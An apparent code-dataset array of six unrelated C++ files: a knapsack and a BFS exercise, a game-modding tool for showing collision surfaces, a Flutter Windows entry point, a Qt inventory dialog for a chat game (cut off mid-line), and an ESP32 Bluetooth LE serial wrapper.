    "//  0 1 Knapsack\n// Easy\n// 40/40\n// Average time to solve is 15m\n// Contributed by\n// 360 upvotes\n// Asked in companies\n// Problem statement\n// A thief is robbing a store and can carry a maximal weight of W into his knapsack. There are N items and the ith item weighs wi and is of value vi. Considering the constraints of the maximum weight that a knapsack can carry, you have to find and return the maximum value that a thief can generate by stealing items.\n\n// Detailed explanation ( Input/output format, Notes, Images )\n// Constraints:\n// 1 <= T <= 10\n// 1 <= N <= 10^2\n// 1<= wi <= 50\n// 1 <= vi <= 10^2\n// 1 <= W <= 10^3\n\n// Time Limit: 1 second\n// Sample Input:\n// 1 \n// 4\n// 1 2 4 5\n// 5 4 8 6\n// 5\n// Sample Output:\n// 13\n\n#include <bits/stdc++.h> \nint helper(vector<int>&weight,vector<int>&value,int n,int maxWeight,vector<vector<int>>&dp){\n\tif(maxWeight==0 || n==0){\n\t\treturn 0;\n\t}\n\tif(dp[maxWeight][n]!=-1){\n\t\treturn dp[maxWeight][n];\n\t}\n\tif(weight[n-1]<=maxWeight){\n\t\treturn dp[maxWeight][n]=max(value[n-1]+helper(weight,value,n-1,maxWeight-weight[n-1],dp),helper(weight,value,n-1,maxWeight,dp));\n\t}\n\treturn helper(weight,value,n-1,maxWeight,dp);\n}\nint knapsack(vector<int> weight, vector<int> value, int n, int maxWeight) \n{\n\t// Write your code here\n\tvector<vector<int>>dp(maxWeight+1,vector<int>(n+1,-1));\n\treturn helper(weight,value,n,maxWeight,dp);\t\n\n}",
    "#include \"cg/cg_hooks.hpp\"\n#include \"cg_init.hpp\"\n#include \"global_macros.hpp\"\n\n#include <chrono>\n#include <thread>\n#include <windows.h>\n#include <array>\n\n#include \"cg/cg_local.hpp\"\n#include \"cg/cg_offsets.hpp\"\n#include <cm/cm_brush.hpp>\n#include <cm/cm_export.hpp>\n#include <cm/cm_typedefs.hpp>\n\n#include \"cmd/cmd.hpp\"\n\n#include \"dvar/dvar.hpp\"\n#include \"utils/engine.hpp\"\n\nusing namespace std::chrono_literals;\n\nconst unsigned char completeVersion[] =\n{\n    BUILD_YEAR_CH0, BUILD_YEAR_CH1, BUILD_YEAR_CH2, BUILD_YEAR_CH3,\n    '-',\n    BUILD_MONTH_CH0, BUILD_MONTH_CH1,\n    '-',\n    BUILD_DAY_CH0, BUILD_DAY_CH1,\n    'T',\n    BUILD_HOUR_CH0, BUILD_HOUR_CH1,\n    ':',\n    BUILD_MIN_CH0, BUILD_MIN_CH1,\n    ':',\n    BUILD_SEC_CH0, BUILD_SEC_CH1,\n    '\\0'\n};\n\nvoid CG_Init()\n{\n    std::this_thread::sleep_for(300ms);\n    CG_CreatePermaHooks();\n    CG_MemoryTweaks();\n\n    Cmd_AddCommand(\"cm_mapexport\", CM_MapExport);\n    Cmd_AddCommand(\"cm_showCollisionFilter\", CM_ShowCollisionFilter);\n\n    dvar_limits l{};\n    dvar_value v{};\n\n    v.integer = 0;\n\n    static const char* poly_types[] = { \"Edges\", \"Polygons\" };\n    static const char* showCollisionNames[] = { \"Disabled\", \"Brushes\", \"Terrain\", \"Both\" };\n    static const char* elevator_types[] = { \"Disabled\", \"Enabled\", \"Include Corners\" };\n\n    l.enumeration.stringCount = 4;\n    l.enumeration.strings = showCollisionNames;\n\n\n    Dvar_RegisterNew(\"cm_showCollision\", dvar_type::enumeration, dvar_flags::saved,\n        \"Select whether to show the terrain, brush or all collision surface groups\", v, l);\n\n    l.enumeration.stringCount = 2;\n    l.enumeration.strings = poly_types;\n\n    Dvar_RegisterNew(\"cm_showCollisionPolyType\", dvar_type::enumeration, dvar_flags::saved,\n        \"Select whether to display the collision surfaces as wireframe or poly interiors\", v, l);\n\n    v.value = 2000;\n    l.value.max = FLT_MAX;\n    l.value.min = 0.f;\n\n    Dvar_RegisterNew(\"cm_showCollisionDist\", dvar_type::value, dvar_flags::saved, \"Maximum distance to show collision surfaces\", v, l);\n\n    v.value = 0.5f;\n    l.value.max = 1.f;\n    l.value.min = 0.f;\n    Dvar_RegisterNew(\"cm_showCollisionPolyAlpha\", dvar_type::value, dvar_flags::saved, \"Collision transparency\", v, l);\n\n    v.enabled = true;\n    Dvar_RegisterNew(\"cm_showCollisionDepthTest\", dvar_type::boolean, dvar_flags::saved, \"Select whether to use depth test in collision surfaces display\", v, l);\n\n    v.enabled = false;\n\n    Dvar_RegisterNew(\"cm_onlyBounces\", dvar_type::boolean, dvar_flags::none, \"Only display surfaces which can be bounced\", v, l);\n\n    l.enumeration.stringCount = 3;\n    l.enumeration.strings = elevator_types;\n    v.integer = 0;\n\n    Dvar_RegisterNew(\"cm_onlyElevators\", dvar_type::enumeration, dvar_flags::none, \"Only display surfaces which can be elevated\", v, l);\n\n    v.enabled = true;\n\n    Dvar_RegisterNew(\"cm_ignoreNonColliding\", dvar_type::boolean, dvar_flags::saved, \"Don't display surfaces which don't have collisions\", v, l);\n    \n    static std::string date = std::string(__DATE__) + \" - \" + std::string(__TIME__) + \" ^1by ^2xkejj\";\n\n    v.string = date.c_str();\n    Dvar_RegisterNew(\"tool_version\", dvar_type::string, dvar_flags::write_protected, date.c_str(), v, l);\n}\n\ntemplate<MemoryAddress_t Mem>\nstruct CGameMemoryTweak\n{\n    Mem address{};\n    std::string tweaked{};\n    std::string original{};\n\n};\n\n\nconstexpr std::array<CGameMemoryTweak<std::int32_t>, 1> tweaks = {\n    CGameMemoryTweak{.address = 0x6E6528, .tweaked = std::string(\"\\xEB\\x00\\xBA\\xF0\\xF5\", 5), .original = \"\\x74\\x14\" }, //jmp -> jnz in RB_EndSceneRendering\n};\n\nvoid CG_MemoryTweaks()\n{\n\n    for (const auto& tweak : tweaks) {\n        Engine::Tools::write_bytes(tweak.address, tweak.tweaked);\n    }\n}",
    "#include <iostream>\n#include <vector>\n#include <queue>\n\nusing std::vector;\nusing std::queue;\nusing namespace std;\n\n\nint distance(vector<vector<int> >& adj, int s, int t) {\n    //write your code here\n    vector<int> dis(adj.size());\n    queue<int> q;\n    int v;\n\n    q.push(s);\n\n    for (size_t i = 0; i < dis.size(); i++)\n    {\n        dis[i] = -1;\n    }\n    dis[s] = 0;\n\n    while (!q.empty())\n    {\n        v = q.front();\n        q.pop();\n\n        for (size_t i = 0; i < adj[v].size(); i++)\n        {\n            if (dis[adj[v][i]] == -1)\n            {\n                q.push(adj[v][i]);\n                // cout << adj[v][i] << endl;\n                dis[adj[v][i]] = dis[v] + 1;\n            }\n        }\n\n\n    }\n\n    return dis[t];\n}\n\nint main() {\n    int n, m;\n    std::cin >> n >> m;\n    vector<vector<int> > adj(n, vector<int>());\n    for (int i = 0; i < m; i++) {\n        int x, y;\n        std::cin >> x >> y;\n        adj[x - 1].push_back(y - 1);\n        adj[y - 1].push_back(x - 1);\n    }\n    int s, t;\n    std::cin >> s >> t;\n    s--, t--;\n    std::cout << distance(adj, s, t);\n}\n",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"invoice\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "// Created by Eternity_boundary on Jan 5,2025\n#include \"Headers\\backpackMan.h\"\n#include \"Headers\\Celestian.h\"\n#include \"Headers\\JsonRequestHandler.h\"\n#include \"Headers\\LogProcessor.h\"\n#pragma warning(push)\n#pragma warning(disable: _CELESTIAN_DISABLED_WARNING)\n#include <QDebug>\n#include <QJsonArray>\n#include <QJsonDocument>\n#include <QJsonObject>\n#include <QMessageBox>\n#include <QNetworkReply>\n#include <QNetworkRequest>\n#include <QTimer>\n#pragma warning(pop)\n\nqint64 selectedPrice;//\u4ef7\u683c\nbackpackMan::backpackMan(QWidget* parent)\n\t: QDialog(parent), networkManager(new QNetworkAccessManager(this)), currentGroupId(-1)\n{\n\tui.setupUi(this);\n\tui.tableWidget->setColumnCount(2);\n\tsetWindowTitle(\"\u80cc\u5305\u7ba1\u7406\");\n\n\t// \u8bbe\u7f6e\u8868\u5934\n\tQStringList headers;\n\theaders << \"\u836f\u6750\u540d\u79f0\" << \"\u6570\u91cf\";\n\tui.tableWidget->setHorizontalHeaderLabels(headers);\n\n\t// \u7981\u7528\u8868\u683c\u7684\u7f16\u8f91\u4e0e\u62d6\u52a8\n\tui.tableWidget->setEditTriggers(QAbstractItemView::NoEditTriggers);  // \u7981\u7528\u7f16\u8f91\n\tui.tableWidget->setDragDropMode(QAbstractItemView::NoDragDrop);      // \u7981\u7528\u62d6\u653e\n\tui.tableWidget->setDragEnabled(false);\n\tui.tableWidget->setDropIndicatorShown(false);\n\n\tconnect(ui.refreshPage, &QPushButton::clicked, this, &backpackMan::onRefreshPageClicked);\n\tconnect(ui.tableWidget, &QTableWidget::itemDoubleClicked, this, &backpackMan::onTableItemDoubleClicked);\n\tconnect(ui.previousPage, &QPushButton::clicked, this, &backpackMan::onPreviousPageClicked);\n\tconnect(ui.nextPage, &QPushButton::clicked, this, &backpackMan::onNextPageClicked);\n\tconnect(ui.sell, &QPushButton::clicked, this, &backpackMan::onSellButtonClicked);\n}\n\nvoid backpackMan::onDataReceived(const QString& data)\n{\n\t// 1. \u4f7f\u7528\u5de5\u5177\u7c7b\u6e05\u6d17\u6570\u636e\n\tQString cleanedData = LogProcessor::processLogMessage(data, currentGroupId);\n\tqDebug() << \"\u6e05\u6d17\u540e\u7684\u6570\u636e\uff1a\" << cleanedData;\n\n\t// \u989d\u5916\u5904\u7406\uff1a\u83b7\u53d6\u4ef7\u683c\n\tQString selectedPriceStr;  // \u9009\u4e2d\u7684\u836f\u6750\u4ef7\u683c\u5b57\u7b26\u4e32\n\tQRegularExpression priceRegex(R\"(\u4ef7\u683c:(\\d{1,4}(?:\\.\\d{1,2})?[\u4e07\u4ebf]))\");\n\tQRegularExpressionMatch priceMatch = priceRegex.match(cleanedData);\n\tif (priceMatch.hasMatch()) {\n\t\tselectedPriceStr = priceMatch.captured(1);           // \u63d0\u53d6\u4ef7\u683c\u5b57\u7b26\u4e32\n\t\tselectedPrice = convertPrice(selectedPriceStr);      // \u8f6c\u6362\u4ef7\u683c\u4e3a\u6574\u6570\n\n\t\t// \u4fee\u6539\u663e\u793a\u4e3a\u4e07\u5355\u4f4d\uff0c\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\n\t\tqDebug() << \"\u63d0\u53d6\u7684\u4ef7\u683c\uff1a\" << selectedPriceStr;\n\t\tqDebug() << \"\u8f6c\u6362\u540e\u7684\u4ef7\u683c\uff1a\" << QString::number(selectedPrice / 1e4, 'f', 2) << \"\u4e07\";\n\t}\n\n\t// 2. \u8fdb\u4e00\u6b65\u6e05\u7406\u566a\u97f3\uff08\u79fb\u9664\u5e38\u89c1\u65e0\u5173\u90e8\u5206\uff09\n\tcleanedData.remove(QRegularExpression(R\"(&enter=false&reply=false)\"));  // \u79fb\u9664\u65e0\u5173\u53c2\u6570\n\tcleanedData.remove(QRegularExpression(R\"(\u67e5\u770b|\u70bc\u91d1|\u4e0a\u4e00\u9875|\u80cc\u5305\u5e2e\u52a9|\u8df3\u8f6c\u3010\u9875\u6570\u3011|\u4e0b\u4e00\u9875)\"));  // \u79fb\u9664\u65e0\u5173\u5185\u5bb9\n\tcleanedData.replace(QRegularExpression(R\"(\\s{2,})\"), \" \");  // \u66ff\u6362\u591a\u4f59\u7a7a\u683c\u4e3a\u5355\u4e2a\u7a7a\u683c\n\tqDebug() << \"\u8fdb\u4e00\u6b65\u6e05\u7406\u540e\u7684\u6570\u636e\uff1a\" << cleanedData;\n\n\t// 3. \u6b63\u5219\u8868\u8fbe\u5f0f\u63d0\u53d6\u836f\u6750\u540d\u79f0\u548c\u6570\u91cf\n\tQRegularExpression regex(R\"((?:\u4e00\u54c1\u836f\u6750|\u4e8c\u54c1\u836f\u6750|\u4e09\u54c1\u836f\u6750|\u56db\u54c1\u836f\u6750|\u4e94\u54c1\u836f\u6750|\u516d\u54c1\u836f\u6750|\u4e03\u54c1\u836f\u6750|\u516b\u54c1\u836f\u6750|\u4e5d\u54c1\u836f\u6750)\\s(\\S+)\\s\u6570\u91cf:(\\d+))\");\n\tQRegularExpressionMatchIterator i = regex.globalMatch(cleanedData);\n\n\t// 4. \u904d\u5386\u5339\u914d\u7ed3\u679c\u5e76\u586b\u5165\u8868\u683c\uff08\u907f\u514d\u91cd\u590d\u63d2\u5165\uff09\n\twhile (i.hasNext()) {\n\t\tQRegularExpressionMatch match = i.next();\n\t\tQString herbName = match.captured(1);  // \u63d0\u53d6\u836f\u6750\u540d\u79f0\n\t\tQString quantity = match.captured(2);  // \u63d0\u53d6\u6570\u91cf\n\n\t\t// \u68c0\u67e5\u8868\u683c\u4e2d\u662f\u5426\u5df2\u5b58\u5728\u76f8\u540c\u7684\u836f\u6750\u540d\u79f0\n\t\tbool isDuplicate = false;\n\t\tfor (int row = 0; row < ui.tableWidget->rowCount(); ++row) {\n\t\t\tif (ui.tableWidget->item(row, 0)->text() == herbName) {\n\t\t\t\tisDuplicate = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tif (isDuplicate) {\n\t\t\tcontinue;  // \u8df3\u8fc7\u5df2\u5b58\u5728\u7684\u836f\u6750\n\t\t}\n\n\t\t// \u5728\u8868\u683c\u4e2d\u63d2\u5165\u65b0\u884c\n\t\tint rowCount = ui.tableWidget->rowCount();\n\t\tui.tableWidget->insertRow(rowCount);\n\n\t\t// \u6dfb\u52a0\u836f\u6750\u540d\u79f0\u5230\u7b2c\u4e00\u5217\n\t\tQTableWidgetItem* herbItem = new QTableWidgetItem(herbName);\n\t\tui.tableWidget->setItem(rowCount, 0, herbItem);\n\n\t\t// \u6dfb\u52a0\u6570\u91cf\u5230\u7b2c\u4e8c\u5217\n\t\tQTableWidgetItem* quantityItem = new QTableWidgetItem(quantity);\n\t\tui.tableWidget->setItem(rowCount, 1, quantityItem);\n\t}\n\n\tqDebug() << \"\u63d0\u53d6\u5e76\u663e\u793a\u4e86\u836f\u6750\u6570\u636e\uff1a\" << cleanedData;\n}\n\nvoid backpackMan::onRefreshPageClicked()\n{\n\tQTableWidget* table = ui.tableWidget;\n\ttable->clearContents();\n\ttable->setRowCount(0);\n\tJsonRequestHandler::sendJsonRequest(SENDTOPRIVATE, \"\u836f\u6750\u80cc\u5305\");\n}\n\nqint16 pageCount = 1;\n\nvoid backpackMan::onPreviousPageClicked()\n{\n\tif (pageCount == 1) {\n\t\tQMessageBox::warning(this, \"\u63d0\u793a\", \"\u5df2\u7ecf\u662f\u7b2c\u4e00\u9875\u4e86\uff01\");\n\t\treturn;\n\t}\n\tpageCount--;\n\tQTableWidget* table = ui.tableWidget;\n\ttable->clearContents();\n\ttable->setRowCount(0);\n\tJsonRequestHandler::sendJsonRequest(SENDTOPRIVATE, \"\u836f\u6750\u80cc\u5305 \" + QString::number(pageCount));\n}\n\nvoid backpackMan::onNextPageClicked()\n{\n\tQTableWidget* table = ui.tableWidget;\n\ttable->clearContents();\n\ttable->setRowCount(0);\n\tpageCount++;\n\tJsonRequestHandler::sendJsonRequest(SENDTOPRIVATE, \"\u836f\u6750\u80cc\u5305 \" + QString::number(pageCount));\n}\n\nvoid backpackMan::onSellButtonClicked()\n{\n\tif (selectedHerbName.isEmpty()) {\n\t\tQMessageBox::warning(this, \"\u63d0\u793a\", \"\u8bf7\u5148\u9009\u62e9\u4e00\u4e2a\u836f\u6750\uff01\");\n\t\treturn;\n\t}\n\n\tif (selectedPrice == -1) {\n\t\tQMessageBox::warning(this, \"\u63d0\u793a\", \"\u4ef7\u683c\u65e0\u6548\uff0c\u8bf7\u68c0\u67e5\u6570\u636e\uff01\");\n\t\treturn;\n\t}\n\n\tJsonRequestHandler::sendJsonRequest(SENDTOPRIVATE, \"\u574a\u5e02\u5237\u65b0\" + selectedHerbName);\n\t// TODO: \u6dfb\u52a0\u68c0\u6d4b\u5230\u552e\u51fa\u4e0a\u9650\u6ea2\u51fa\u63d0\u793a\n\tQTimer::singleShot(2000, this, [this]() {\n\t\tQMessageBox msgBox;\n\t\tmsgBox.setWindowTitle(\"\u786e\u8ba4\u4e0a\u67b6\");\n\t\tmsgBox.setText(\"\u9009\u62e9\u7684\u836f\u6750\u4e3a\uff1a\" + selectedHerbName + \"\\n\u4ef7\u683c\uff1a\" + QString::number(selectedPrice / 1e4, 'f', 2) + \"\u4e07\\n\u662f\u5426\u786e\u8ba4\u4e0a\u67b6\uff1f\");\n\t\tmsgBox.setStandardButtons(QMessageBox::Yes | QMessag",
    "#include \"serial-ble.h\"\n\nbleRxHandler::bleRxHandler():NimBLECharacteristicCallbacks(){}\n\nbleRxHandler::bleRxHandler(void (*callback)(const char *data, int data_size)):NimBLECharacteristicCallbacks(){\n\tsetHandler(callback);\n}\n\nvoid bleRxHandler::setHandler(void (*callback)(const char *data, int data_size)) {\n\tcbOnReceive = callback;\n}\n\nvoid bleRxHandler::onWrite(NimBLECharacteristic *pCharacteristic){\n\n\tString data_str = pCharacteristic->getValue();\n\tuint8_t len = pCharacteristic->getDataLength();\n\n\tif (cbOnReceive != nullptr)\n\t\tcbOnReceive(data_str.c_str(), len);\n\telse\n\t\tconsole.error(BLE_T, \"No Rx Serial BLE callback was specified\");\n}\n\nvoid ServerCallbacks::onConnect(NimBLEServer *pServer, ble_gap_conn_desc *desc){\n\tString bleRemoteAddress = SerialBle::btMAcAddress_toString(desc->peer_id_addr.val);\n\tconsole.success(BLE_T, \"BLE client connected, remote address is \" + bleRemoteAddress);\n\tNimBLEDevice::stopAdvertising();\n\n\tuint16_t id = pServer->getPeerDevices()[0];\n\tconsole.info(BLE_T, \"Connection ID = \" + String(id));\n};\n\nvoid ServerCallbacks::onDisconnect(NimBLEServer *pServer){\n\tconsole.warning(BLE_T, \"Client disconnected - Start advertising\");\n\tNimBLEDevice::startAdvertising();\n};\n\n\nSerialBle::SerialBle(NimBLECharacteristicCallbacks *pRxHandler) {\n\t_pRxHandler = pRxHandler;\n}\n\nvoid SerialBle::init(const char * name, bool name_with_address) {\n\n\tconsole.info(BLE_T, \"Start BLE configuration\");\n\n\t// Reading Bluetooth MAC address ------------------------------------------------------\n\tgetBtMacAddress(_btMacAddr);\n\tif(name_with_address)\n\t\tsnprintf(_btNameStr, sizeof(_btNameStr), \"%s_%02X%02X%02X\", name, _btMacAddr[3], _btMacAddr[4], _btMacAddr[5]);\n\telse\n\t\tstrncpy(_btNameStr, name, sizeof(_btNameStr));\n\tprintBLEinfo();\n\n\tNimBLEDevice::init(_btNameStr);\n\tNimBLEDevice::setPower(ESP_PWR_LVL_P9); // +9 dB\n\n\t// NimBLEDevice::setSecurityAuth(true, true, true);\n\t// NimBLEDevice::setSecurityPasskey(123456);\n\t// NimBLEDevice::setSecurityIOCap(BLE_HS_IO_DISPLAY_ONLY);\n\n\t_pServer = NimBLEDevice::createServer();\n\t_pServer->setCallbacks(new ServerCallbacks());\n\n\t_pService = _pServer->createService(BLEUUID(SERVICE_UUID));\n\n\t// Create BLE Characteristic for Transmitting Data --------------------------------------------\n\t_pTxCharacteristic = _pService->createCharacteristic(\n\t\tBLEUUID(TX_DATA_UUID),\n\t\tNIMBLE_PROPERTY::NOTIFY);\n\n\t// Create BLE Characteristic for Receiving Data -----------------------------------------------\n\tNimBLECharacteristic *pRxCharacteristic = _pService->createCharacteristic(\n\t\tBLEUUID(RX_DATA_UUID),\n\t\tNIMBLE_PROPERTY::WRITE);\n\n\t// pRxCharacteristic->setCallbacks(cbData);\n\t//pRxCharacteristic->setCallbacks(new bleRxHandler());\n\tpRxCharacteristic->setCallbacks(_pRxHandler);\n\tconsole.log(BLE_T, \"Created characteristic for Data\");\n\n\t// Start service\n\t_pService->start();\n\n\tNimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();\n\tpAdvertising->addServiceUUID(_pService->getUUID());\n\tpAdvertising->setScanResponse(true);\n\tpAdvertising->start();\n\n\tconsole.success(BLE_T, \"BLE configuration completed\");\n\n\t_ble_enabled = true;\n}\n\nvoid SerialBle::getBtMacAddress(uint8_t *address) {\n\tesp_read_mac(address, ESP_MAC_BT);\n}\n\nString SerialBle::btMAcAddress_toString(const uint8_t *address) {\n\tchar btMacAddrStr[18];\n\tsnprintf(btMacAddrStr, 18, \"%02X:%02X:%02X:%02X:%02X:%02X\", address[0], address[1], address[2], address[3], address[4], address[5]);\n\treturn String(btMacAddrStr);\n}\n\nString genDeviceName(const uint8_t *address, const char* name){\n\tchar btNameStr[14] = \"\";\n\tsnprintf(btNameStr, sizeof(btNameStr), \"%s_%02X%02X%02X\", name, address[3], address[4], address[5]);\n\treturn String(btNameStr);\n}\n\nvoid SerialBle::printBLEinfo(void) {\n\tconsole.info(BLE_T, \"Device Bluetooth MAC Address: \" + btMAcAddress_toString(_btMacAddr));\n\tconsole.info(BLE_T, \"Device Bluetooth name: \" + String(_btNameStr));\n}\n\nvoid SerialBle::deinitBLE(void) {\n\tNimBLEDevice::deinit(true);\n\t_ble_enabled = false;\n\tconsole.success(BLE_T, \"BLE was stopped\");\n}\n\nvoid SerialBle::sendData(uint8_t *data, int size) {\n\tchar buffer[BLE_TX_MAX_SIZE] = \"\";\n\tchar tmp[6];\n\tString str;\n\n\tif(_ble_enabled) {\n\t\tif(size < 0)\n\t\t\tconsole.warning(BLE_T, \"NOTIFY: buffer is empty\");\n\t\telse if(size > BLE_TX_MAX_SIZE)\n\t\t\tconsole.warning(BLE_T, \"NOTIFY: buffer exceed maximum length\");\n\t\telse {\n\t\t\t// Print values in hexadecimal\n\t\t\tfor(uint8_t i = 0; i < size; i++) {\n\t\t\t\tbuffer[i] = *(data + i);\n\t\t\t\tsprintf(tmp, \"0x%.2X \", buffer[i]);\n\t\t\t\tstr += String(tmp);\n\t\t\t}\n\t\t\tconsole.success(BLE_T, \"NOTIFY (size = \" + String(size) + \"): \\\"\" + String(buffer) + \"\\\" [\" + str + \"]\");\n\t\t\t_pTxCharacteristic->setValue(data, size);\n\t\t\t_pTxCharacteristic->notify();   \n\t    }\n\t}\n\telse\n\t\tconsole.warning(BLE_T, \"NOTIFY: impossible to send data due BLE disabling\");\n}\n\nbool SerialBle::isEnabled(void) {\n\treturn _ble_enabled;\n}"
]